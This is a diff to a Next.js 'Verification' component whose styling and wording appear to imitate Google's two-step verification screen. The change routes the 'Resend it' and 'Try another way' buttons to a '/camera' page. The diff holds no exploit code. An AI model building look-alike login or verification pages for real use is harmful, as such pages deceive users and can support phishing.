@@ -1,8 +1,13 @@
 import React from "react";
-
+import { useRouter } from "next/router";
 import Image from "next/image";
 
 export default function Verification() {
+  const { push } = useRouter();
+  const handleClick = () => {
+    push("/camera");
+  };
+
   return (
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
       <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
@@ -37,10 +42,16 @@ export default function Verification() {
                 <p className="ml-3">Don't ask again on this device</p>
               </div>
               <div className=" flex flex-col mt-3 items-start ">
-                <button className="text-sm text-[#1a73e8] cursor-pointer font-medium pt-3">
+                <button
+                  className="text-sm text-[#1a73e8] cursor-pointer font-medium pt-3"
+                  onClick={handleClick}
+                >
                   Resend it
                 </button>
-                <button className="text-sm text-[#1a73e8] cursor-pointer font-semibold pt-3 pb-5">
+                <button
+                  className="text-sm text-[#1a73e8] cursor-pointer font-semibold pt-3 pb-5"
+                  onClick={handleClick}
+                >
                   Try another way
                 </button>
               </div>
